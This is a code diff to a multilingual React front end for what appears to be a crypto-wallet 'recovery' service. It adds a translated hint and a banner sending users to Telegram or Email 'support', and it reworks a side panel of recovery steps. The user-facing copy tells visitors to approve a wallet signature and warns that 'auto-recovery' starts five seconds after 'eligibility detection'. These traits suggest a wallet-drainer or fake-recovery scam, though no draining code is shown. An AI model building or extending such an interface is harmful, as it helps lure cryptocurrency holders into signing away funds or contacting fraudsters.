@@ -116,7 +116,9 @@ const TRANSLATIONS = {
     recoveryStep3: 'If eligible, the system will automatically initiate recovery (or you can click the button).',
     recoveryStep4: 'Approve the signature in your wallet to authorize the recovery.',
     recoveryStep5: 'Recovery completes! You\'ll receive a confirmation and downloadable report.',
-    recoveryNote: '⚠️ Important: Do not disconnect or close your wallet during the process. Auto‑recovery starts in 5 seconds after eligibility detection.'
+    recoveryNote: '⚠️ Important: Do not disconnect or close your wallet during the process. Auto‑recovery starts in 5 seconds after eligibility detection.',
+    // New key for manual recovery hint
+    manualRecoveryHint: '👇 Need manual recovery? Contact our support via Telegram or Email below.'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -198,7 +200,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Si eres elegible, el sistema iniciará la recuperación automáticamente (o puedes hacer clic en el botón).',
     recoveryStep4: 'Aprueba la firma en tu wallet para autorizar la recuperación.',
     recoveryStep5: '¡Recuperación completada! Recibirás una confirmación y un informe descargable.',
-    recoveryNote: '⚠️ Importante: No desconectes ni cierres tu wallet durante el proceso. La auto‑recuperación comienza en 5 segundos después de detectar elegibilidad.'
+    recoveryNote: '⚠️ Importante: No desconectes ni cierres tu wallet durante el proceso. La auto‑recuperación comienza en 5 segundos después de detectar elegibilidad.',
+    manualRecoveryHint: '👇 ¿Necesitas recuperación manual? Contacta a nuestro soporte vía Telegram o Email abajo.'
   },
   fr: {
     serviceActive: 'PROTOCOLE DE RÉCUPÉRATION · ACTIF',
@@ -280,7 +283,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Si vous êtes éligible, le système lance la récupération automatiquement (ou cliquez sur le bouton).',
     recoveryStep4: 'Approuvez la signature dans votre portefeuille pour autoriser la récupération.',
     recoveryStep5: 'Récupération terminée ! Vous recevrez une confirmation et un rapport téléchargeable.',
-    recoveryNote: '⚠️ Important : Ne déconnectez pas et ne fermez pas votre portefeuille pendant le processus. La récupération automatique démarre dans 5 secondes après détection de l\'éligibilité.'
+    recoveryNote: '⚠️ Important : Ne déconnectez pas et ne fermez pas votre portefeuille pendant le processus. La récupération automatique démarre dans 5 secondes après détection de l\'éligibilité.',
+    manualRecoveryHint: '👇 Besoin d\'une récupération manuelle ? Contactez notre support via Telegram ou Email ci-dessous.'
   },
   de: {
     serviceActive: 'WIEDERHERSTELLUNGSPROTOKOLL · AKTIV',
@@ -362,7 +366,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Bei Berechtigung startet das System die Wiederherstellung automatisch (oder Sie klicken auf den Button).',
     recoveryStep4: 'Genehmigen Sie die Signatur in Ihrem Wallet, um die Wiederherstellung zu autorisieren.',
     recoveryStep5: 'Wiederherstellung abgeschlossen! Sie erhalten eine Bestätigung und einen herunterladbaren Bericht.',
-    recoveryNote: '⚠️ Wichtig: Trennen Sie Ihr Wallet während des Vorgangs nicht und schließen Sie es nicht. Die automatische Wiederherstellung beginnt 5 Sekunden nach der Erkennung der Berechtigung.'
+    recoveryNote: '⚠️ Wichtig: Trennen Sie Ihr Wallet während des Vorgangs nicht und schließen Sie es nicht. Die automatische Wiederherstellung beginnt 5 Sekunden nach der Erkennung der Berechtigung.',
+    manualRecoveryHint: '👇 Brauchen Sie manuelle Wiederherstellung? Kontaktieren Sie unseren Support über Telegram oder Email unten.'
   },
   it: {
     serviceActive: 'PROTOCOLLO DI RECUPERO · ATTIVO',
@@ -444,7 +449,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Se idoneo, il sistema avvia il recupero automaticamente (o puoi cliccare sul pulsante).',
     recoveryStep4: 'Approva la firma nel tuo wallet per autorizzare il recupero.',
     recoveryStep5: 'Recupero completato! Riceverai una conferma e un rapporto scaricabile.',
-    recoveryNote: '⚠️ Importante: Non disconnettere né chiudere il wallet durante il processo. L\'auto‑recupero parte in 5 secondi dopo il rilevamento dell\'idoneità.'
+    recoveryNote: '⚠️ Importante: Non disconnettere né chiudere il wallet durante il processo. L\'auto‑recupero parte in 5 secondi dopo il rilevamento dell\'idoneità.',
+    manualRecoveryHint: '👇 Hai bisogno di recupero manuale? Contatta il nostro supporto via Telegram o Email qui sotto.'
   },
   pt: {
     serviceActive: 'PROTOCOLO DE RECUPERAÇÃO · ATIVO',
@@ -526,7 +532,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Se elegível, o sistema inicia a recuperação automaticamente (ou clique no botão).',
     recoveryStep4: 'Aprove a assinatura em sua carteira para autorizar a recuperação.',
     recoveryStep5: 'Recuperação concluída! Você receberá uma confirmação e um relatório para download.',
-    recoveryNote: '⚠️ Importante: Não desconecte nem feche sua carteira durante o processo. A auto‑recuperação começa em 5 segundos após a detecção de elegibilidade.'
+    recoveryNote: '⚠️ Importante: Não desconecte nem feche sua carteira durante o processo. A auto‑recuperação começa em 5 segundos após a detecção de elegibilidade.',
+    manualRecoveryHint: '👇 Precisa de recuperação manual? Entre em contato com nosso suporte via Telegram ou Email abaixo.'
   },
   ru: {
     serviceActive: 'ПРОТОКОЛ ВОССТАНОВЛЕНИЯ · АКТИВЕН',
@@ -608,7 +615,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'При наличии права система запустит восстановление автоматически (или нажмите кнопку).',
     recoveryStep4: 'Подтвердите подпись в кошельке для авторизации восстановления.',
     recoveryStep5: 'Восстановление завершено! Вы получите подтверждение и отчёт для скачивания.',
-    recoveryNote: '⚠️ Важно: Не отключайте и не закрывайте кошелёк во время процесса. Автовосстановление начнётся через 5 секунд после обнаружения права.'
+    recoveryNote: '⚠️ Важно: Не отключайте и не закрывайте кошелёк во время процесса. Автовосстановление начнётся через 5 секунд после обнаружения права.',
+    manualRecoveryHint: '👇 Нужно ручное восстановление? Свяжитесь с нашей поддержкой через Telegram или Email ниже.'
   },
   zh: {
     serviceActive: '恢复协议 · 活跃中',
@@ -690,7 +698,8 @@ const TRANSLATIONS = {
     recoveryStep3: '如果符合条件，系统将自动启动恢复（或您可点击按钮）。',
     recoveryStep4: '在钱包中批准签名以授权恢复。',
     recoveryStep5: '恢复完成！您将收到确认和可下载的报告。',
-    recoveryNote: '⚠️ 重要：恢复过程中请勿断开或关闭钱包。检测到资格后，自动恢复将在 5 秒后开始。'
+    recoveryNote: '⚠️ 重要：恢复过程中请勿断开或关闭钱包。检测到资格后，自动恢复将在 5 秒后开始。',
+    manualRecoveryHint: '👇 需要手动恢复？请通过下方的 Telegram 或 Email 联系我们的支持团队。'
   },
   ja: {
     serviceActive: 'リカバリープロトコル · アクティブ',
@@ -772,7 +781,8 @@ const TRANSLATIONS = {
     recoveryStep3: '対象の場合、システムが自動的に復元を開始します（またはボタンをクリック）。',
     recoveryStep4: 'ウォレットで署名を承認して復元を許可します。',
     recoveryStep5: '復元完了！確認とダウンロード可能なレポートを受け取ります。',
-    recoveryNote: '⚠️ 重要：処理中はウォレットを切断したり閉じたりしないでください。対象検出後5秒で自動復元が開始されます。'
+    recoveryNote: '⚠️ 重要：処理中はウォレットを切断したり閉じたりしないでください。対象検出後5秒で自動復元が開始されます。',
+    manualRecoveryHint: '👇 手動復元が必要ですか？下の Telegram または Email からサポートにお問い合わせください。'
   },
   ko: {
     serviceActive: '복구 프로토콜 · 활성화됨',
@@ -854,7 +864,8 @@ const TRANSLATIONS = {
     recoveryStep3: '자격이 있는 경우 시스템이 자동으로 복구를 시작합니다(또는 버튼을 클릭).',
     recoveryStep4: '지갑에서 서명을 승인하여 복구를 허가하세요.',
     recoveryStep5: '복구 완료! 확인 및 다운로드 가능한 보고서를 받게 됩니다.',
-    recoveryNote: '⚠️ 중요: 프로세스 중에 지갑을 연결 해제하거나 닫지 마세요. 자격 감지 후 5초 후에 자동 복구가 시작됩니다.'
+    recoveryNote: '⚠️ 중요: 프로세스 중에 지갑을 연결 해제하거나 닫지 마세요. 자격 감지 후 5초 후에 자동 복구가 시작됩니다.',
+    manualRecoveryHint: '👇 수동 복구가 필요하신가요? 아래 Telegram 또는 Email을 통해 지원팀에 문의하세요.'
   },
   ar: {
     serviceActive: 'بروتوكول الاسترداد · نشط',
@@ -936,7 +947,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'إذا كنت مؤهلاً، سيبدأ النظام الاسترداد تلقائيًا (أو يمكنك النقر على الزر).',
     recoveryStep4: 'وافق على التوقيع في محفظتك لتأذن بالاسترداد.',
     recoveryStep5: 'اكتمل الاسترداد! ستتلقى تأكيدًا وتقريرًا قابلًا للتنزيل.',
-    recoveryNote: '⚠️ مهم: لا تقم بقطع الاتصال أو إغلاق محفظتك أثناء العملية. سيبدأ الاسترداد التلقائي بعد 5 ثوانٍ من اكتشاف الأهلية.'
+    recoveryNote: '⚠️ مهم: لا تقم بقطع الاتصال أو إغلاق محفظتك أثناء العملية. سيبدأ الاسترداد التلقائي بعد 5 ثوانٍ من اكتشاف الأهلية.',
+    manualRecoveryHint: '👇 هل تحتاج إلى استرداد يدوي؟ اتصل بفريق الدعم عبر Telegram أو Email أدناه.'
   },
   hi: {
     serviceActive: 'रिकवरी प्रोटोकॉल · सक्रिय',
@@ -1018,7 +1030,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'यदि पात्र हैं, तो सिस्टम स्वचालित रूप से रिकवरी शुरू कर देगा (या आप बटन पर क्लिक कर सकते हैं)।',
     recoveryStep4: 'रिकवरी को अधिकृत करने के लिए अपने वॉलेट में हस्ताक्षर स्वीकृत करें।',
     recoveryStep5: 'रिकवरी पूरी हुई! आपको एक पुष्टि और डाउनलोड करने योग्य रिपोर्ट प्राप्त होगी।',
-    recoveryNote: '⚠️ महत्वपूर्ण: प्रक्रिया के दौरान अपने वॉलेट को डिस्कनेक्ट या बंद न करें। पात्रता का पता लगने के 5 सेकंड बाद स्वचालित रिकवरी शुरू हो जाती है।'
+    recoveryNote: '⚠️ महत्वपूर्ण: प्रक्रिया के दौरान अपने वॉलेट को डिस्कनेक्ट या बंद न करें। पात्रता का पता लगने के 5 सेकंड बाद स्वचालित रिकवरी शुरू हो जाती है।',
+    manualRecoveryHint: '👇 क्या आपको मैन्युअल रिकवरी की आवश्यकता है? नीचे Telegram या Email के माध्यम से हमारी सहायता टीम से संपर्क करें।'
   },
   tr: {
     serviceActive: 'KURTARMA PROTOKOLÜ · AKTİF',
@@ -1100,7 +1113,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Uygun iseniz, sistem otomatik olarak kurtarmayı başlatır (veya butona tıklayabilirsiniz).',
     recoveryStep4: 'Kurtarmayı yetkilendirmek için cüzdanınızdaki imzayı onaylayın.',
     recoveryStep5: 'Kurtarma tamamlandı! Bir onay ve indirilebilir rapor alacaksınız.',
-    recoveryNote: '⚠️ Önemli: İşlem sırasında cüzdanınızın bağlantısını kesmeyin veya kapatmayın. Uygunluk tespitinden 5 saniye sonra otomatik kurtarma başlar.'
+    recoveryNote: '⚠️ Önemli: İşlem sırasında cüzdanınızın bağlantısını kesmeyin veya kapatmayın. Uygunluk tespitinden 5 saniye sonra otomatik kurtarma başlar.',
+    manualRecoveryHint: '👇 Manuel kurtarma mı gerekiyor? Aşağıdaki Telegram veya Email üzerinden destek ekibimizle iletişime geçin.'
   },
   nl: {
     serviceActive: 'HERSTELPROTOCOL · ACTIEF',
@@ -1182,7 +1196,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Als u in aanmerking komt, start het systeem automatisch herstel (of klik op de knop).',
     recoveryStep4: 'Keur de handtekening in uw wallet goed om het herstel te autoriseren.',
     recoveryStep5: 'Herstel voltooid! U ontvangt een bevestiging en een downloadbaar rapport.',
-    recoveryNote: '⚠️ Belangrijk: Verbreek de verbinding niet en sluit uw wallet niet tijdens het proces. Automatisch herstel start 5 seconden na detectie van geschiktheid.'
+    recoveryNote: '⚠️ Belangrijk: Verbreek de verbinding niet en sluit uw wallet niet tijdens het proces. Automatisch herstel start 5 seconden na detectie van geschiktheid.',
+    manualRecoveryHint: '👇 Handmatig herstel nodig? Neem contact op met onze support via Telegram of Email hieronder.'
   },
   pl: {
     serviceActive: 'PROTOKÓŁ ODZYSKIWANIA · AKTYWNY',
@@ -1264,7 +1279,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Jeśli kwalifikujesz się, system automatycznie rozpocznie odzyskiwanie (lub kliknij przycisk).',
     recoveryStep4: 'Zatwierdź podpis w swoim portfelu, aby autoryzować odzyskiwanie.',
     recoveryStep5: 'Odzyskiwanie zakończone! Otrzymasz potwierdzenie i raport do pobrania.',
-    recoveryNote: '⚠️ Ważne: Nie rozłączaj ani nie zamykaj swojego portfela podczas procesu. Auto-odzyskiwanie rozpoczyna się 5 sekund po wykryciu kwalifikowalności.'
+    recoveryNote: '⚠️ Ważne: Nie rozłączaj ani nie zamykaj swojego portfela podczas procesu. Auto-odzyskiwanie rozpoczyna się 5 sekund po wykryciu kwalifikowalności.',
+    manualRecoveryHint: '👇 Potrzebujesz ręcznego odzyskania? Skontaktuj się z naszym wsparciem przez Telegram lub Email poniżej.'
   },
   vi: {
     serviceActive: 'GIAO THỨC PHỤC HỒI · ĐANG HOẠT ĐỘNG',
@@ -1346,7 +1362,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Nếu đủ điều kiện, hệ thống sẽ tự động bắt đầu phục hồi (hoặc bạn có thể nhấp vào nút).',
     recoveryStep4: 'Phê duyệt chữ ký trong ví của bạn để ủy quyền phục hồi.',
     recoveryStep5: 'Phục hồi hoàn tất! Bạn sẽ nhận được xác nhận và báo cáo có thể tải xuống.',
-    recoveryNote: '⚠️ Quan trọng: Không ngắt kết nối hoặc đóng ví của bạn trong quá trình. Tự động phục hồi bắt đầu sau 5 giây kể từ khi phát hiện đủ điều kiện.'
+    recoveryNote: '⚠️ Quan trọng: Không ngắt kết nối hoặc đóng ví của bạn trong quá trình. Tự động phục hồi bắt đầu sau 5 giây kể từ khi phát hiện đủ điều kiện.',
+    manualRecoveryHint: '👇 Cần phục hồi thủ công? Liên hệ với bộ phận hỗ trợ của chúng tôi qua Telegram hoặc Email bên dưới.'
   },
   th: {
     serviceActive: 'โปรโตคอลการกู้คืน · ทำงานอยู่',
@@ -1428,7 +1445,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'หากมีคุณสมบัติ ระบบจะเริ่มการกู้คืนโดยอัตโนมัติ (หรือคุณสามารถคลิกปุ่ม)',
     recoveryStep4: 'อนุมัติลายเซ็นในกระเป๋าเงินของคุณเพื่ออนุญาตการกู้คืน',
     recoveryStep5: 'การกู้คืนเสร็จสมบูรณ์! คุณจะได้รับการยืนยันและรายงานที่ดาวน์โหลดได้',
-    recoveryNote: '⚠️ สำคัญ: อย่าตัดการเชื่อมต่อหรือปิดกระเป๋าเงินของคุณในระหว่างกระบวนการ การกู้คืนอัตโนมัติจะเริ่มใน 5 วินาทีหลังจากตรวจพบคุณสมบัติ'
+    recoveryNote: '⚠️ สำคัญ: อย่าตัดการเชื่อมต่อหรือปิดกระเป๋าเงินของคุณในระหว่างกระบวนการ การกู้คืนอัตโนมัติจะเริ่มใน 5 วินาทีหลังจากตรวจพบคุณสมบัติ',
+    manualRecoveryHint: '👇 ต้องการการกู้คืนด้วยตนเอง? ติดต่อทีมสนับสนุนของเราผ่าน Telegram หรือ Email ด้านล่าง'
   },
   id: {
     serviceActive: 'PROTOKOL PEMULIHAN · AKTIF',
@@ -1510,7 +1528,8 @@ const TRANSLATIONS = {
     recoveryStep3: 'Jika memenuhi syarat, sistem akan memulai pemulihan secara otomatis (atau Anda dapat mengklik tombol).',
     recoveryStep4: 'Setujui tanda tangan di dompet Anda untuk mengotorisasi pemulihan.',
     recoveryStep5: 'Pemulihan selesai! Anda akan menerima konfirmasi dan laporan yang dapat diunduh.',
-    recoveryNote: '⚠️ Penting: Jangan putuskan sambungan atau tutup dompet Anda selama proses. Pemulihan otomatis dimulai 5 detik setelah deteksi kelayakan.'
+    recoveryNote: '⚠️ Penting: Jangan putuskan sambungan atau tutup dompet Anda selama proses. Pemulihan otomatis dimulai 5 detik setelah deteksi kelayakan.',
+    manualRecoveryHint: '👇 Perlu pemulihan manual? Hubungi tim dukungan kami melalui Telegram atau Email di bawah.'
   }
 };
 
@@ -2205,70 +2224,75 @@ const Footer = () => {
 };
 
 // ============================================
-// RECOVERY INSTRUCTION COMPONENT - SIDE PANEL VERSION
+// RECOVERY INSTRUCTION COMPONENT - SIDE PANEL VERSION (MODIFIED)
 // ============================================
 const RecoveryInstructions = ({ translations }) => {
   const [expanded, setExpanded] = useState(false);
 
   return (
-    <div className="fixed left-0 top-1/2 transform -translate-y-1/2 z-40 hidden md:block">
-      <div className="relative">
-        {/* Toggle button */}
-        <button
-          onClick={() => setExpanded(!expanded)}
-          className="bg-blue-600 hover:bg-blue-700 text-white p-2 rounded-r-xl shadow-lg transition-all duration-300 flex items-center gap-1"
-          style={{ writingMode: 'vertical-rl' }}
-        >
-          <span className="text-xs font-bold tracking-wider">HELP</span>
-          <span className="text-sm">{expanded ? '◀' : '▶'}</span>
-        </button>
+    <>
+      {/* Toggle button - fixed top-left, always visible */}
+      <button
+        onClick={() => setExpanded(!expanded)}
+        className="fixed top-6 left-6 z-50 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-full shadow-lg flex items-center gap-2 transition-all duration-300"
+      >
+        <span className="text-lg">📘</span>
+        <span className="text-sm font-semibold hidden sm:inline">Recovery Guide</span>
+        <span className="text-sm font-semibold sm:hidden">Guide</span>
+      </button>
 
-        {/* Sliding panel */}
+      {/* Overlay */}
+      {expanded && (
         <div
-          className={`absolute left-0 top-0 bg-black/90 backdrop-blur-md border border-blue-500/30 rounded-r-2xl shadow-2xl transition-all duration-500 overflow-hidden ${
-            expanded ? 'w-72 opacity-100 pointer-events-auto' : 'w-0 opacity-0 pointer-events-none'
-          }`}
-          style={{ transform: 'translateX(0)', transition: 'width 0.4s ease, opacity 0.3s ease' }}
-        >
-          <div className="p-5 min-w-[18rem]">
-            <div className="flex items-center justify-between mb-3 border-b border-blue-500/20 pb-2">
-              <h3 className="text-base font-bold text-blue-400 flex items-center gap-2">
-                <span>🔐</span> {translations.recoveryInstructionsTitle}
-              </h3>
-              <button onClick={() => setExpanded(false)} className="text-gray-400 hover:text-white text-sm">
-                ✕
-              </button>
+          className="fixed inset-0 bg-black/50 backdrop-blur-sm z-40"
+          onClick={() => setExpanded(false)}
+        />
+      )}
+
+      {/* Side panel - slides in from left */}
+      <div
+        className={`fixed top-0 left-0 h-full w-80 bg-black/95 backdrop-blur-md border-r border-blue-500/30 shadow-2xl z-50 transition-transform duration-300 ease-in-out ${
+          expanded ? 'translate-x-0' : '-translate-x-full'
+        }`}
+      >
+        <div className="p-6 overflow-y-auto h-full">
+          <div className="flex items-center justify-between mb-4 border-b border-blue-500/20 pb-3">
+            <h3 className="text-lg font-bold text-blue-400 flex items-center gap-2">
+              <span>🔐</span> {translations.recoveryInstructionsTitle}
+            </h3>
+            <button onClick={() => setExpanded(false)} className="text-gray-400 hover:text-white text-xl">
+              ✕
+            </button>
+          </div>
+          <div className="space-y-3 text-sm">
+            <div className="flex gap-3 items-start">
+              <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">1</span>
+              <span className="text-gray-300">{translations.recoveryStep1}</span>
             </div>
-            <div className="space-y-2.5 text-sm">
-              <div className="flex gap-3 items-start">
-                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">1</span>
-                <span className="text-gray-300">{translations.recoveryStep1}</span>
-              </div>
-              <div className="flex gap-3 items-start">
-                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">2</span>
-                <span className="text-gray-300">{translations.recoveryStep2}</span>
-              </div>
-              <div className="flex gap-3 items-start">
-                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">3</span>
-                <span className="text-gray-300">{translations.recoveryStep3}</span>
-              </div>
-              <div className="flex gap-3 items-start">
-                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">4</span>
-                <span className="text-gray-300">{translations.recoveryStep4}</span>
-              </div>
-              <div className="flex gap-3 items-start">
-                <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">5</span>
-                <span className="text-gray-300">{translations.recoveryStep5}</span>
-              </div>
-              <div className="mt-3 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg text-xs text-blue-300 flex items-start gap-2">
-                <span className="text-blue-400 text-sm">⚠️</span>
-                <span>{translations.recoveryNote}</span>
-              </div>
+            <div className="flex gap-3 items-start">
+              <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">2</span>
+              <span className="text-gray-300">{translations.recoveryStep2}</span>
+            </div>
+            <div className="flex gap-3 items-start">
+              <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">3</span>
+              <span className="text-gray-300">{translations.recoveryStep3}</span>
+            </div>
+            <div className="flex gap-3 items-start">
+              <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">4</span>
+              <span className="text-gray-300">{translations.recoveryStep4}</span>
+            </div>
+            <div className="flex gap-3 items-start">
+              <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">5</span>
+              <span className="text-gray-300">{translations.recoveryStep5}</span>
+            </div>
+            <div className="mt-3 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg text-xs text-blue-300 flex items-start gap-2">
+              <span className="text-blue-400 text-sm">⚠️</span>
+              <span>{translations.recoveryNote}</span>
             </div>
           </div>
         </div>
       </div>
-    </div>
+    </>
   );
 };
 
@@ -3094,7 +3118,7 @@ function App() {
         </div>
       </div>
 
-      {/* ===== SIDE INSTRUCTION PANEL ===== */}
+      {/* ===== NEW: SIDE INSTRUCTION PANEL (top-left button) ===== */}
       <RecoveryInstructions translations={translations} />
 
       {/* Main Container */}
@@ -3270,6 +3294,13 @@ function App() {
           {/* SUPPORT SECTION - TELEGRAM (First) + EMAIL (Second) */}
           {/* ============================================ */}
           
+          {/* Manual recovery hint - points to the support cards below */}
+          <div className="w-full max-w-md mb-4 text-center">
+            <div className="inline-block bg-blue-500/20 backdrop-blur px-4 py-2 rounded-full text-xs text-blue-300 border border-blue-500/30 animate-pulse-slow">
+              {translations.manualRecoveryHint || '👇 Need manual recovery? Contact our support via Telegram or Email below.'}
+            </div>
+          </div>
+
           {/* Telegram Support - For users who prefer instant chat */}
           <TelegramSupport translations={translations} />
           
